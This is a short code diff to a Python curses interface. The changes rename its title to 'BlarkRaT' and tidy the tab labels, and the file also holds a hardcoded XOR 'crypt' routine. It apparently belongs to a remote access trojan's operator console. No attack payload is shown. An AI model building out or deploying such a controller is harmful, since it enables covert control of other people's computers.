@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import curses, curses.panel, random, select, socket, ssl, sys, threading, time
+import curses, curses.panel, random, select, socket, ssl, sys, string, threading, time
 from Queue import Queue
 from itertools import cycle, izip
 
@@ -7,6 +7,8 @@ q = Queue()
 logs = {'MAIN':{'log':[]}}
 
 key = "blarknob"
+
+printable = string.ascii_letters + string.digits + string.punctuation + ' '
 
 def crypt(m):
     return ''.join(chr(ord(c)^ord(k)) for c, k in izip(m, cycle(key)))
@@ -226,10 +228,13 @@ class guiThread(threading.Thread):
         panel2 = curses.panel.new_panel(self.win2)
         panel5 = curses.panel.new_panel(self.win5)
         panel4 = curses.panel.new_panel(self.win4)
-        self.win1.addstr(1,1,'Wildcat GUI ' + str(ax) + 'x' + str(ay) + ' Current threads: ' + '0')
+        self.win1.addstr(1,1,'BlarkRaT ' + str(ax) + 'x' + str(ay) + ' Current threads: ' + '0')
         tabtext = ''
         for i in logs.keys():
-            if i == self.tabfocus:
+            focused = (i == self.tabfocus)
+            if '.' in i:
+                i = '.'.join(i.split('.')[2:])
+            if focused:
                 tabtext = tabtext + '>' + i + '< '
             else:   
                 tabtext = tabtext + ' ' + i + '  '
